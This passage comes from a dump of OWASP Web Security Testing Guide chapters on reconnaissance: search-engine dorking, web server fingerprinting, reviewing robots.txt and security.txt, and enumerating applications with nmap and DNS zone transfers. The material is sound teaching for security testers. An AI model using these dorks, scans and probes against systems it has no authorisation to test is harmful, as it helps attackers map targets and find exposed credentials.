[Bing](https://www.bing.com/), a search engine owned and operated by Microsoft, and the second [most popular](https://en.wikipedia.org/wiki/Web_search_engine#Market_share) worldwide. Supports [advanced search keywords](https://help.bing.microsoft.com/#apex/18/en-US/10001/-1).\n- [binsearch.info](https://binsearch.info/), a search engine for binary Usenet newsgroups.\n- [Common Crawl](https://commoncrawl.org/), \"an open repository of web crawl data that can be accessed and analyzed by anyone.\"\n- [DuckDuckGo](https://duckduckgo.com/), a privacy-focused search engine that compiles results from many different [sources](https://help.duckduckgo.com/results/sources/). Supports [search syntax](https://help.duckduckgo.com/duckduckgo-help-pages/results/syntax/).\n- [Google](https://www.google.com/), which offers the world's [most popular](https://en.wikipedia.org/wiki/Web_search_engine#Market_share) search engine, and uses a ranking system to attempt to return the most relevant results. Supports [search operators](https://support.google.com/websearch/answer/2466433).\n- [Internet Archive Wayback Machine](https://archive.org/web/), \"building a digital library of internet sites and other cultural artifacts in digital form.\"\n- [Shodan](https://www.shodan.io/), a service for searching internet-connected devices and services. Usage options include a limited free plan as well as paid subscription plans.\n\n### Search Operators\n\nA search operator is a special keyword or syntax that extends the capabilities of regular search queries, and can help obtain more specific results. They generally take the form of `operator:query`. Here are some commonly supported search operators:\n\n- `site:` will limit the search to the provided domain.\n- `inurl:` will only return results that include the keyword in the URL.\n- `intitle:` will only return results that have the keyword in the page title.\n- `intext:` or `inbody:` will only search for the keyword in the body of pages.\n- `filetype:` will match only a specific file type, i.e. `.png`, or `.php`.\n\nFor example, to find the web content of owasp.org as indexed by a typical search engine, the syntax required is:\n\n```text\nsite:owasp.org\n```\n\n![Google Site Operation Search Result Example](images/Google_site_Operator_Search_Results_Example_20200406.png)\\\n*Figure 4.1.1-1: Google Site Operation Search Result Example*\n\n### Viewing Cached Content\n\nTo search for content that has previously been indexed, use the `cache:` operator. This is helpful for viewing content that may have changed since the time it was indexed, or that may no longer be available. Not all search engines provide cached content to search; the most useful source at time of writing is Google.\n\nTo view `owasp.org` as it is cached, the syntax is:\n\n```text\ncache:owasp.org\n```\n\n![Google Cache Operation Search Result Example](images/Google_cache_Operator_Search_Results_Example_20200406.png)\\\n*Figure 4.1.1-2: Google Cache Operation Search Result Example*\n\n### Google Hacking or Dorking\n\nSearching with operators can be a very effective discovery technique when combined with the creativity of the tester. Operators can be chained to effectively discover specific kinds of sensitive files and information. This technique, called [Google hacking](https://en.wikipedia.org/wiki/Google_hacking) or Dorking, is also possible using other search engines, as long as the search operators are supported.\n\nA database of dorks, like the [Google Hacking Database](https://www.exploit-db.com/google-hacking-database), is a useful resource that can help uncover specific information. Some categories of dorks available on this database include:\n\n- Footholds\n- Files containing usernames\n- Sensitive Directories\n- Web Server Detection\n- Vulnerable Files\n- Vulnerable Servers\n- Error Messages\n- Files containing juicy info\n- Files containing passwords\n- Sensitive Online Shopping Info\n\n## Remediation\n\nCarefully consider the sensitivity of design and configuration information before it is posted online.\n\nPeriodically review the sensitivity of existing design and configuration information that is posted online.\n", "timestamp": "2025-10-24T11:39:42.135000"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server.md", "content": "# Fingerprint Web Server\n\n|ID          |\n|------------|\n|WSTG-INFO-02|\n\n## Summary\n\nWeb server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundamentals of how these tools attempt to identify software, and why this is useful.\n\nAccurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.\n\n## Test Objectives\n\n- Determine the version and type of a running web server to enable further discovery of any known vulnerabilities.\n\n## How to Test\n\nTechniques used for web server fingerprinting include [banner grabbing](https://en.wikipedia.org/wiki/Banner_grabbing), eliciting responses to malformed requests, and using automated tools to perform more robust scans that use a combination of tactics. The fundamental premise on which all these techniques operate is the same. They all strive to elicit some response from the web server which can then be compared to a database of known responses and behaviors, and thus matched to a known server type.\n\n### Banner Grabbing\n\nA banner grab is performed by sending an HTTP request to the web server and examining its [response header](https://developer.mozilla.org/en-US/docs/Glossary/Response_header). This can be accomplished using a variety of tools, including `telnet` for HTTP requests, or `openssl` for requests over TLS/SSL.\n\nFor example, here is the response to a request sent to an Apache server.\n\n```http\nHTTP/1.1 200 OK\nDate: Thu, 05 Sep 2019 17:42:39 GMT\nServer: Apache/2.4.41 (Unix)\nLast-Modified: Thu, 05 Sep 2019 17:40:42 GMT\nETag: \"75-591d1d21b6167\"\nAccept-Ranges: bytes\nContent-Length: 117\nConnection: close\nContent-Type: text/html\n...\n```\n\nHere is another response, this time sent by nginx.\n\n```http\nHTTP/1.1 200 OK\nServer: nginx/1.17.3\nDate: Thu, 05 Sep 2019 17:50:24 GMT\nContent-Type: text/html\nContent-Length: 117\nLast-Modified: Thu, 05 Sep 2019 17:40:42 GMT\nConnection: close\nETag: \"5d71489a-75\"\nAccept-Ranges: bytes\n...\n```\n\nHere's what a response sent by lighttpd looks like.\n\n```sh\nHTTP/1.0 200 OK\nContent-Type: text/html\nAccept-Ranges: bytes\nETag: \"4192788355\"\nLast-Modified: Thu, 05 Sep 2019 17:40:42 GMT\nContent-Length: 117\nConnection: close\nDate: Thu, 05 Sep 2019 17:57:57 GMT\nServer: lighttpd/1.4.54\n```\n\nIn these examples, the server type and version is clearly exposed. However, security-conscious applications may obfuscate their server information by modifying the header. For example, here is an excerpt from the response to a request for a site with a modified header:\n\n```sh\nHTTP/1.1 200 OK\nServer: Website.com\nDate: Thu, 05 Sep 2019 17:57:06 GMT\nContent-Type: text/html; charset=utf-8\nStatus: 200 OK\n...\n```\n\nIn cases where the server information is obscured, testers may guess the type of server based on the ordering of the header fields. Note that in the Apache example above, the fields follow this order:\n\n- Date\n- Server\n- Last-Modified\n- ETag\n- Accept-Ranges\n- Content-Length\n- Connection\n- Content-Type\n\nHowever, in both the nginx and obscured server examples, the fields in common follow this order:\n\n- Server\n- Date\n- Content-Type\n\nTesters can use this information to guess that the obscured server is nginx. However, considering that a number of different web servers may share the same field ordering and fields can be modified or removed, this method is not definite.\n\n### Sending Malformed Requests\n\nWeb servers may be identified by examining their error responses, and in the cases where they have not been customized, their default error pages. One way to compel a server to present these is by sending intentionally incorrect or malformed requests.\n\nFor example, here is the response to a request for the non-existent method `SANTA CLAUS` from an Apache server.\n\n```sh\nGET / SANTA CLAUS/1.1\n\n\nHTTP/1.1 400 Bad Request\nDate: Fri, 06 Sep 2019 19:21:01 GMT\nServer: Apache/2.4.41 (Unix)\nContent-Length: 226\nConnection: close\nContent-Type: text/html; charset=iso-8859-1\n\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>400 Bad Request</title>\n</head><body>\n<h1>Bad Request</h1>\n<p>Your browser sent a request that this server could not understand.<br />\n</p>\n</body></html>\n```\n\nHere is the response to the same request from nginx.\n\n```sh\nGET / SANTA CLAUS/1.1\n\n\n<html>\n<head><title>404 Not Found</title></head>\n<body>\n<center><h1>404 Not Found</h1></center>\n<hr><center>nginx/1.17.3</center>\n</body>\n</html>\n```\n\nHere is the response to the same request from lighttpd.\n\n```sh\nGET / SANTA CLAUS/1.1\n\n\nHTTP/1.0 400 Bad Request\nContent-Type: text/html\nContent-Length: 345\nConnection: close\nDate: Sun, 08 Sep 2019 21:56:17 GMT\nServer: lighttpd/1.4.54\n\n<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"\n         \"https://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n<html xmlns=\"https://www.w3.org/1999/xhtml/\" xml:lang=\"en\" lang=\"en\">\n <head>\n  <title>400 Bad Request</title>\n </head>\n <body>\n  <h1>400 Bad Request</h1>\n </body>\n</html>\n```\n\nAs default error pages offer many differentiating factors between types of web servers, their examination can be an effective method for fingerprinting even when server header fields are obscured.  \nFurthermore, this [resource](https://0xdf.gitlab.io/cheatsheets/404) can be handy, especially when you come across default error pages that do not disclose the web server type.\n\n### Using Automated Scanning Tools\n\nAs stated earlier, web server fingerprinting is often included as a functionality of automated scanning tools. These tools are able to make requests similar to those demonstrated above, as well as send other more server-specific probes. Automated tools can compare responses from web servers much faster than manual testing, and utilize large databases of known responses to attempt server identification. For these reasons, automated tools are more likely to produce accurate results.\n\nHere are some commonly-used scan tools that include web server fingerprinting functionality.\n\n- [Netcraft](https://toolbar.netcraft.com/site_report), an online tool that scans sites for information, including web server details.\n- [Nikto](https://github.com/sullo/nikto), an Open Source command-line scanning tool.\n- [Nmap](https://nmap.org/), an Open Source command-line tool that also has a GUI, [Zenmap](https://nmap.org/zenmap/).\n\n## Remediation\n\nWhile exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\n- Obscuring web server information in headers, such as with Apache's [mod_headers module](https://httpd.apache.org/docs/current/mod/mod_headers.html).\n- Using a hardened [reverse proxy server](https://en.wikipedia.org/wiki/Proxy_server#Reverse_proxies) to create an additional layer of security between the web server and the internet.\n- Ensuring that web servers are kept up-to-date with the latest software and security patches.\n", "timestamp": "2025-10-24T11:39:42.246531"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage.md", "content": "# Review Webserver Metafiles for Information Leakage\n\n|ID          |\n|------------|\n|WSTG-INFO-03|\n\n## Summary\n\nThis section describes how to test various metadata files for information leakage of the web application's path(s), or functionality. Furthermore, the list of directories that are to be avoided by Spiders, Robots, or Crawlers can also be created as a dependency for [Map execution paths through application](07-Map_Execution_Paths_Through_Application.md). Other information may also be collected to identify attack surface, technology details, or for use in social engineering engagement.\n\n## Test Objectives\n\n- Identify hidden or obfuscated paths and functionality through the analysis of metadata files.\n- Extract and map other information that could lead to a better understanding of the systems at hand.\n\n## How to Test\n\n> Any of the actions performed below with `wget` could also be done with `curl`. Many Dynamic Application Security Testing (DAST) tools such as ZAP and Burp Suite include checks or parsing for these resources as part of their spider/crawler functionality. They can also be identified using various [Google Dorks](https://en.wikipedia.org/wiki/Google_hacking) or leveraging advanced search features such as `inurl:`.\n\n### Robots\n\nWeb Spiders, Robots, or Crawlers retrieve a web page and then recursively traverse hyperlinks to retrieve further web content. Their accepted behavior is specified by the [Robots Exclusion Protocol](https://www.robotstxt.org) of the [robots.txt](https://www.robotstxt.org/) file in the web root directory.\n\nAs an example, the beginning of the `robots.txt` file from [Google](https://www.google.com/robots.txt) sampled on 2020 May 5 is quoted below:\n\n```text\nUser-agent: *\nDisallow: /search\nAllow: /search/about\nAllow: /search/static\nAllow: /search/howsearchworks\nDisallow: /sdch\n...\n```\n\nThe [User-Agent](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent) directive refers to the specific web spider/robot/crawler. For example, the `User-Agent: Googlebot` refers to the spider from Google while `User-Agent: bingbot` refers to a crawler from Microsoft. `User-Agent: *` in the example above applies to all [web spiders/robots/crawlers](https://support.google.com/webmasters/answer/6062608?visit_id=637173940975499736-3548411022&rd=1).\n\nThe `Disallow` directive specifies which resources are prohibited by spiders/robots/crawlers. In the example above, the following are prohibited:\n\n```text\n...\nDisallow: /search\n...\nDisallow: /sdch\n...\n```\n\nWeb spiders/robots/crawlers can [intentionally ignore](https://blog.isc2.org/isc2_blog/2008/07/the-attack-of-t.html) the `Disallow` directives specified in a `robots.txt` file. Hence, `robots.txt` should not be considered as a mechanism to enforce restrictions on how web content is accessed, stored, or republished by third parties.\n\nThe `robots.txt` file is retrieved from the web root directory of the web server. For example, to retrieve the `robots.txt` from `www.google.com` using `wget` or `curl`:\n\n```bash\n$ curl -O -Ss https://www.google.com/robots.txt && head -n5 robots.txt\nUser-agent: *\nDisallow: /search\nAllow: /search/about\nAllow: /search/static\nAllow: /search/howsearchworks\n...\n```\n\n#### Analyze robots.txt Using Google Webmaster Tools\n\nSite owners can use the Google \"Analyze robots.txt\" function to analyze the site as part of its [Google Webmaster Tools](https://www.google.com/webmasters/tools). This tool can assist with testing and the procedure is as follows:\n\n1. Sign into Google Webmaster Tools with a Google account.\n2. On the dashboard, enter the URL for the site to be analyzed.\n3. Choose between the available methods and follow the on screen instruction.\n\n### META Tags\n\n`<META>` tags are located within the `HEAD` section of each HTML document and should be consistent across a site in the event that the robot/spider/crawler start point does not begin from a document link other than webroot i.e. a [deep link](https://en.wikipedia.org/wiki/Deep_linking). The Robots directive can also be specified using a specific [META tag](https://www.robotstxt.org/meta.html).\n\n#### Robots META Tag\n\nIf there is no `<META NAME=\"ROBOTS\" ... >` entry, then the \"Robots Exclusion Protocol\" defaults to `INDEX,FOLLOW` respectively. Therefore, the other two valid entries defined by the \"Robots Exclusion Protocol\" are prefixed with `NO...` i.e. `NOINDEX` and `NOFOLLOW`.\n\nBased on the Disallow directive(s) listed within the `robots.txt` file in webroot, a regular expression search for `<META NAME=\"ROBOTS\"` is undertaken within each web page. The result is then compared to the robots.txt file in the webroot.\n\n#### Miscellaneous META Information Tags\n\nOrganizations often embed informational META tags in web content to support various technologies such as screen readers, social networking previews, search engine indexing, etc. Such meta-information can be of value to testers in identifying technologies used, and additional paths/functionality to explore and test. The following meta information was retrieved from `www.whitehouse.gov` via View Page Source on 2020 May 05:\n\n```html\n...\n<meta property=\"og:locale\" content=\"en_US\" />\n<meta property=\"og:type\" content=\"website\" />\n<meta property=\"og:title\" content=\"The White House\" />\n<meta property=\"og:description\" content=\"We, the citizens of America, are now joined in a great national effort to rebuild our country and to restore its promise for all. – President Donald Trump.\" />\n<meta property=\"og:url\" content=\"https://www.whitehouse.gov/\" />\n<meta property=\"og:site_name\" content=\"The White House\" />\n<meta property=\"fb:app_id\" content=\"1790466490985150\" />\n<meta property=\"og:image\" content=\"https://www.whitehouse.gov/wp-content/uploads/2017/12/wh.gov-share-img_03-1024x538.png\" />\n<meta property=\"og:image:secure_url\" content=\"https://www.whitehouse.gov/wp-content/uploads/2017/12/wh.gov-share-img_03-1024x538.png\" />\n<meta name=\"twitter:card\" content=\"summary_large_image\" />\n<meta name=\"twitter:description\" content=\"We, the citizens of America, are now joined in a great national effort to rebuild our country and to restore its promise for all. – President Donald Trump.\" />\n<meta name=\"twitter:title\" content=\"The White House\" />\n<meta name=\"twitter:site\" content=\"@whitehouse\" />\n<meta name=\"twitter:image\" content=\"https://www.whitehouse.gov/wp-content/uploads/2017/12/wh.gov-share-img_03-1024x538.png\" />\n<meta name=\"twitter:creator\" content=\"@whitehouse\" />\n...\n<meta name=\"apple-mobile-web-app-title\" content=\"The White House\">\n<meta name=\"application-name\" content=\"The White House\">\n<meta name=\"msapplication-TileColor\" content=\"#0c2644\">\n<meta name=\"theme-color\" content=\"#f5f5f5\">\n...\n```\n\n### Sitemaps\n\nA sitemap is a file where a developer or organization can provide information about the pages, videos, and other files offered by the site or application, and the relationship between them. Search engines can use this file to navigate your site more efficiently. Likewise, testers can utilize 'sitemap.xml' files to gain deeper insights into the site or application under investigation.\n\nThe following excerpt is from Google's primary sitemap retrieved 2020 May 05.\n\n```bash\n$ wget --no-verbose https://www.google.com/sitemap.xml && head -n8 sitemap.xml\n2020-05-05 12:23:30 URL:https://www.google.com/sitemap.xml [2049] -> \"sitemap.xml\" [1]\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<sitemapindex xmlns=\"https://www.google.com/schemas/sitemap/0.84\">\n  <sitemap>\n    <loc>https://www.google.com/gmail/sitemap.xml</loc>\n  </sitemap>\n  <sitemap>\n    <loc>https://www.google.com/forms/sitemaps.xml</loc>\n  </sitemap>\n...\n```\n\nExploring from there a tester may wish to retrieve the gmail sitemap `https://www.google.com/gmail/sitemap.xml`:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<urlset xmlns=\"https://www.sitemaps.org/schemas/sitemap/0.9\" xmlns:xhtml=\"https://www.w3.org/1999/xhtml\">\n  <url>\n    <loc>https://www.google.com/intl/am/gmail/about/</loc>\n    <xhtml:link href=\"https://www.google.com/gmail/about/\" hreflang=\"x-default\" rel=\"alternate\"/>\n    <xhtml:link href=\"https://www.google.com/intl/el/gmail/about/\" hreflang=\"el\" rel=\"alternate\"/>\n    <xhtml:link href=\"https://www.google.com/intl/it/gmail/about/\" hreflang=\"it\" rel=\"alternate\"/>\n    <xhtml:link href=\"https://www.google.com/intl/ar/gmail/about/\" hreflang=\"ar\" rel=\"alternate\"/>\n...\n```\n\n### Security TXT\n\n[security.txt](https://securitytxt.org) was ratified by the IETF as [RFC 9116 - A File Format to Aid in Security Vulnerability Disclosure](https://www.rfc-editor.org/rfc/rfc9116.html) which allows sites to define security policies and contact details. There are multiple reasons why this might be of interest in testing scenarios, which include, but are not limited to:\n\n- Identifying further paths or resources to include in discovery/analysis.\n- Open Source intelligence gathering.\n- Finding information on Bug Bounties, etc.\n- Social Engineering.\n\nThe file may be present either in the root of the webserver or in the `.well-known/` directory, for example:\n\n- `https://example.com/security.txt`\n- `https://example.com/.well-known/security.txt`\n\nHere is a real world example retrieved from LinkedIn 2020 May 05:\n\n```bash\n$ wget --no-verbose https://www.linkedin.com/.well-known/security.txt && cat security.txt\n2020-05-07 12:56:51 URL:https://www.linkedin.com/.well-known/security.txt [333/333] -> \"security.txt\" [1]\n# Conforms to IETF `draft-foudil-securitytxt-07`\nContact: mailto:security@linkedin.com\nContact: https://www.linkedin.com/help/linkedin/answer/62924\nEncryption: https://www.linkedin.com/help/linkedin/answer/79676\nCanonical: https://www.linkedin.com/.well-known/security.txt\nPolicy: https://www.linkedin.com/help/linkedin/answer/62924\n```\n\nOpenPGP Public Keys contain some metadata that can provide information about the key itself. Here are some common metadata elements that can be extracted from an OpenPGP Public Key:\n\n- **Key ID**: The Key ID is a short identifier derived from the public key material. It helps identify the key and is often displayed as an eight-character hexadecimal value.\n- **Key Fingerprint**: The Key Fingerprint is a longer and more unique identifier derived from the key material. It is often displayed as a 40-character hexadecimal value. Key fingerprints are commonly used to verify the integrity and authenticity of a public key.\n- **Key Algorithm**: The Key Algorithm represents the cryptographic algorithm used by the public key. OpenPGP supports various algorithms such as RSA, DSA, and ECC (Elliptic Curve Cryptography).\n- **Key Size**: The Key Size refers to the length or size of the cryptographic key in bits. It indicates the strength of the key and determines the level of security provided by the key.\n- **Key Creation Date**: The Key Creation Date indicates when the key was generated or created.\n- **Key Expiration Date**: OpenPGP Public Keys can have an expiration date set, after which they are considered invalid. The Key Expiration Date specifies when the key is no longer valid.\n- **User IDs**: Public keys can have one or more associated User IDs that identify the owner or entity associated with the key. User IDs typically include information such as the name, email address, and optional comments of the key owner.\n\n### Humans TXT\n\n`humans.txt` is an initiative for knowing the people behind a site. It takes the form of a text file that contains information about the different people who have contributed to building the site. This file often (but not always) contains information related to career or job sites/paths.\n\nThe following example was retrieved from Google 2020 May 05:\n\n```bash\n$ wget --no-verbose  https://www.google.com/humans.txt && cat humans.txt\n2020-05-07 12:57:52 URL:https://www.google.com/humans.txt [286/286] -> \"humans.txt\" [1]\nGoogle is built by a large team of engineers, designers, researchers, robots, and others in many different sites across the globe. It is updated continuously, and built with more tools and technologies than we can shake a stick at. If you'd like to help us out, see careers.google.com.\n```\n\n### Other .well-known Information Sources\n\nThere are other RFCs and internet drafts which suggest standardized uses of files within the `.well-known/` directory. Lists of these can be found [here](https://en.wikipedia.org/wiki/List_of_/.well-known/_services_offered_by_webservers) or [here](https://www.iana.org/assignments/well-known-uris/well-known-uris.xhtml).\n\nIt would be fairly simple for a tester to review the RFC/drafts and create a list to be supplied to a crawler or fuzzer, in order to verify the existence or content of such files.\n\n## Tools\n\n- Browser (View Source or Dev Tools functionality)\n- curl\n- wget\n- Burp Suite\n- ZAP\n", "timestamp": "2025-10-24T11:39:42.344542"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/01-Information_Gathering/04-Enumerate_Applications_on_Webserver.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/04-Enumerate_Applications_on_Webserver.md", "content": "# Enumerate Applications on Webserver\n\n|ID          |\n|------------|\n|WSTG-INFO-04|\n\n## Summary\n\nA paramount step in testing for web application vulnerabilities is to find out which particular applications are hosted on a web server. Many applications have known vulnerabilities and known attack strategies that can be exploited in order to gain remote control or to exploit data. In addition, many applications are often misconfigured or not updated, due to the perception that they are only used \"internally\" and therefore no threat exists.\nWith the proliferation of virtual web servers, the traditional 1:1-type relationship between an IP address and a web server is losing much of its original significance. It is not uncommon to have multiple sites or applications whose symbolic names resolve to the same IP address. This scenario is not limited to hosting environments, but also applies to ordinary corporate environments as well.\n\nSecurity professionals are sometimes given a set of IP addresses as a target to test. It is arguable that this scenario is more akin to a penetration test-type engagement, but in any case it is expected that such an assignment would test all web applications accessible through this target. The problem is that the given IP address hosts an HTTP service on port 80, but if a tester should access it by specifying the IP address (which is all they know) it reports \"No web server configured at this address\" or a similar message. But that system could \"hide\" a number of web applications, associated to unrelated symbolic (DNS) names. Obviously, the extent of the analysis is deeply affected depending on whether the tester tests all the applications or only tests the applications that they are aware of.\n\nSometimes, the target specification is richer. The tester may be given a list of IP addresses and their corresponding symbolic names. Nevertheless, this list might convey partial information, i.e., it could omit some symbolic names and the client may not even be aware of that (this is more likely to happen in large organizations).\n\nOther issues affecting the scope of the assessment are represented by web applications published at non-obvious URLs (e.g., `https://www.example.com/some-strange-URL`), which are not referenced elsewhere. This may happen either by error (due to misconfigurations), or intentionally (for example, unadvertised administrative interfaces).\n\nTo address these issues, it is necessary to perform web application discovery.\n\n## Test Objectives\n\n- Enumerate the applications within the scope that exist on a web server.\n\n## How to Test\n\nWeb application discovery is a process that aims to identify web applications on a given infrastructure. The latter is usually specified as a set of IP addresses (maybe a net block), but may consist of a set of DNS symbolic names or a mix of the two. This information is handed out prior to the execution of an assessment, be it a classic-style penetration test or an application-focused assessment. In both cases, unless the rules of engagement specify otherwise (e.g., test only the application located at the URL `https://www.example.com/`), the assessment should strive to be the most comprehensive in scope, i.e. it should identify all the applications accessible through the given target. The following examples examine a few techniques that can be employed to achieve this goal.\n\n> Some of the following techniques apply to Internet-facing web servers, namely DNS and reverse-IP web-based search services and the use of search engines. Examples make use of private IP addresses (such as `192.168.1.100`), which, unless indicated otherwise, represent *generic* IP addresses and are used only for anonymity purposes.\n\nThere are three factors influencing how many applications are related to a given DNS name (or an IP address):\n\n1. **Different Base URL**\n\n    The obvious entry point for a web application is `www.example.com`, i.e., with this shorthand notation we think of the web application originating at `https://www.example.com/` (the same applies for HTTPS). However, even though this is the most common situation, there is nothing forcing the application to start at `/`.\n\n    For example, the same symbolic name may be associated to three web applications such as: `https://www.example.com/app1` `https://www.example.com/app2` `https://www.example.com/app3`\n\n    In this case, the URL `https://www.example.com/` would not be associated with a meaningful page. The three applications would remain **hidden** unless the tester explicitly knows how to access them, i.e., the tester knows *app1*, *app2* or *app3*. There is usually no need to publish web applications in this way, unless the owner doesn’t want them to be accessible in a standard way, and is prepared to inform the users about their exact location. This doesn’t mean that these applications are secret, just that their existence and location is not explicitly advertised.\n\n2. **Non-standard Ports**\n\n    While web applications usually live on port 80 (HTTP) and 443 (HTTPS), there is nothing fixed or mandatory about these port numbers. In fact, web applications may be associated with arbitrary TCP ports, and can be referenced by specifying the port number as follows: `http[s]://www.example.com:port/`. For example, `https://www.example.com:20000/`.\n\n3. **Virtual Hosts**\n\n    DNS allows a single IP address to be associated with one or more symbolic names. For example, the IP address `192.168.1.100` might be associated to DNS names `www.example.com`, `helpdesk.example.com`, `webmail.example.com`. It is not necessary that all the names belong to the same DNS domain. This 1-to-N relationship may be reflected to serve different content by using so called virtual hosts. The information specifying the virtual host we are referring to is embedded in the HTTP 1.1 [Host header](https://tools.ietf.org/html/rfc2616#section-14.23).\n\n    One would not suspect the existence of other web applications in addition to the obvious `www.example.com`, unless they know of `helpdesk.example.com` and `webmail.example.com`.\n\n### Approaches to Address Issue 1 - Non-standard URLs\n\nThere is no way to fully ascertain the existence of non-standard-named web applications. Being non-standard, there are no fixed criteria governing the naming convention, however there are a number of techniques that the tester can use to gain some additional insight.\n\nFirst, if the web server is mis-configured and allows directory browsing, it may be possible to spot these applications. Vulnerability scanners may help in this respect.\n\nSecond, these applications may be referenced by other web pages and there is a chance that they have been spidered and indexed by web search engines. If testers suspect the existence of such **hidden** applications on `www.example.com` they could search using the *site* operator and examining the result of a query for `site: www.example.com`. Among the returned URLs there could be one pointing to such a non-obvious application.\n\nAnother option is to probe for URLs which might be likely candidates for non-published applications. For example, a web mail frontend might be accessible from URLs such as `https://www.example.com/webmail`, `https://webmail.example.com/`, or `https://mail.example.com/`. The same holds for administrative interfaces, which may be published at hidden URLs (for example, a Tomcat administrative interface), and yet not referenced anywhere. So doing a bit of dictionary-style searching (or \"intelligent guessing\") could yield some results. Vulnerability scanners may help in this respect.\n\n### Approaches to Address Issue 2 - Non-standard Ports\n\nIt is easy to check for the existence of web applications on non-standard ports. A port scanner such as Nmap is capable of performing service recognition by means of the `-sV` option, and will identify http[s] services on arbitrary ports. What is required is a full scan of the whole 64k TCP port address space.\n\nFor example, the following command will look up, with a TCP connect scan, all the open ports on IP `192.168.1.100` and will try to determine what services are bound to them (only *essential* switches are shown – Nmap features a broad set of options, whose discussion is out of scope):\n\n`nmap –Pn –sT –sV –p0-65535 192.168.1.100`\n\nIt is sufficient to examine the output and look for HTTP or the indication of TLS-wrapped services (which should be probed to confirm that they are HTTPS). For example, the output of the previous command could look like:\n\n```bash\nInteresting ports on 192.168.1.100:\n(The 65527 ports scanned but not shown below are in state: closed)\nPORT      STATE SERVICE     VERSION\n22/tcp    open  ssh         OpenSSH 3.5p1 (protocol 1.99)\n80/tcp    open  http        Apache httpd 2.0.40 ((Red Hat Linux))\n443/tcp   open  ssl         OpenSSL\n901/tcp   open  http        Samba SWAT administration server\n1241/tcp  open  ssl         Nessus security scanner\n3690/tcp  open  unknown\n8000/tcp  open  http-alt?\n8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1\n```\n\nFrom this example, one can see that:\n\n- There is an Apache HTTP server running on port 80.\n- It looks like there is an HTTPS server on port 443 (but this needs to be confirmed, for example, by visiting `https://192.168.1.100` with a browser).\n- On port 901 there is a Samba SWAT web interface.\n- The service on port 1241 is not HTTPS, but is the TLS-wrapped Nessus daemon.\n- Port 3690 features an unspecified service (Nmap gives back its *fingerprint* - here omitted for clarity - together with instructions to submit it for incorporation in the Nmap fingerprint database, provided you know which service it represents).\n- Another unspecified service on port 8000; this might possibly be HTTP, since it is not uncommon to find HTTP servers on this port. Let's examine this issue:\n\n```bash\n$ telnet 192.168.10.100 8000\nTrying 192.168.1.100...\nConnected to 192.168.1.100.\nEscape character is '^]'.\nGET / HTTP/1.0\n\nHTTP/1.0 200 OK\npragma: no-cache\nContent-Type: text/html\nServer: MX4J-HTTPD/1.0\nexpires: now\nCache-Control: no-cache\n\n<html>\n...\n```\n\nThis confirms that in fact it is an HTTP server. Alternatively, testers could have visited the URL with a web browser; or used the GET or HEAD Perl commands, which mimic HTTP interactions such as the one given above (however HEAD requests may not be honored by all servers).\n\n- Apache Tomcat running on port 8080.\n\nThe same task may be performed by vulnerability scanners, but first check that the scanner of choice is able to identify HTTP[S] services running on non-standard ports. For example, Nessus is capable of identifying them on arbitrary ports (provided it is instructed to scan all the ports), and will provide, with respect to Nmap, a number of tests on known web server vulnerabilities, as well as on the TLS/SSL configuration of HTTPS services. As hinted before, Nessus is also able to spot popular applications or web interfaces which could otherwise go unnoticed (for example, a Tomcat administrative interface).\n\n### Approaches to Address Issue 3 - Virtual Hosts\n\nThere are a number of techniques which may be used to identify DNS names associated to a given IP address `x.y.z.t`.\n\n#### DNS Zone Transfers\n\nThis technique has limited use nowadays, given the fact that zone transfers are largely not honored by DNS servers. However, it could still be worth attempting. First of all, testers must determine the name servers serving `x.y.z.t`. If a symbolic name is known for `x.y.z.t` (let it be `www.example.com`), its name servers can be determined by means of tools such as `nslookup`, `host`, or `dig`, by requesting DNS NS records.\n\nIf no symbolic names are known for `x.y.z.t`, but the target definition contains at least a symbolic name, testers may try to apply the same process and query the name server of that name (hoping that `x.y.z.t` will be served as well by that name server). For example, if the target consists of the IP address `x.y.z.t` and the name `mail.example.com`, determine the name servers for domain `example.com`.\n\nThe following example shows how to identify the name servers for `www.owasp.org` by using the `host` command:\n\n```bash\n$ host -t ns www.owasp.org\nwww.owasp.org is an alias for owasp.org.\nowasp.org name server ns1.secure.net.\nowasp.org name server ns2.secure.net.\n```\n\nA zone transfer can now be requested to the name servers for the domain `example.com`. If the tester is fortunate, they may receive a list of the DNS entries for this domain in response. This will include the obvious `www.example.com` and the not-so-obvious `helpdesk.example.com` and `webmail.example.com` (and possibly others). Check all the names returned by the zone transfer and consider all of those which are related to the target being evaluated.\n\nTrying to request a zone transfer for `owasp.org` from one of its name servers:\n\n```bash\n$ host -l www.owasp.org ns1.secure.net\nUsing domain server:\nName: ns1.secure.net\nAddress: 192.220.124.10#53\nAliases:\n\nHost www.owasp.org not found: 5(REFUSED)\n; Transfer failed.\n```\n\n#### DNS Inverse Queries\n\nThis process is similar to the previous one, but relies on inverse (PTR) DNS records. Rather than requesting a 